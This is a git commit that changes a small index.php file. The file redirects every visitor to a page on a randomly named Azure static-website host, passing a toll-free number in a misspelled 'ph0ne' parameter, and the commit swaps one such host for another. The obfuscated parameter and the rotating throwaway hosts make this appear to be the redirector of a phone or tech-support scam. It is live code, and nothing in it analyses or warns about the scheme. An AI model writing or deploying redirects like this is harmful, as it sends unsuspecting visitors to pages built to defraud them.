9fb52f1d0b23b4c4ef3bd5c087f090e7dc994dcf
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-02-24 20:53:13 +0530

    Update index.php

--- index.php
+++ index.php
@@ -2,7 +2,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://bolw8ih88sdhiswd.z8.web.core.windows.net/index.html?ph0ne=1-888-850-5768");
+header("Location: https://corefx76tdiii89.z12.web.core.windows.net/index.html?ph0ne=1-888-850-5768");
  
 exit;
 ?>
